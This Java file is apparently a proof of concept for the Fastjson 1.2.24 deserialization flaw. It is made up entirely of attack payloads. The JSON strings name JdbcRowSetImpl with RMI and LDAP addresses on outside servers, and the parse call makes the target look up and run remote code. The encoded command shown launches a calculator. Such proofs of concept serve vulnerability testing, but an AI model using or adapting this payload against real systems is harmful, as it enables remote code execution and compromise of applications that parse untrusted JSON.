package fastjson;

import com.alibaba.fastjson.JSON;

public class fastjson_1_2_24 {
    /*
    payload:
    {
    "b":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://10.58.120.200:1099/1ado0p",
            "autoCommit":true
    }
    }
     */
    public static void main(String[] args) {
        String json = "{\n" +
                "    \"b\":{\n" +
                "    \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "            \"dataSourceName\":\"ldap://192.168.26.1:1389/llOvNJoRvY/CommonsCollections1/Exec/eyJjbWQiOiJjYWxjIn0=\",\n" +
                "            \"autoCommit\":true\n" +
                "}\n" +
                "}";

        JSON.parseObject(json);
    }
}
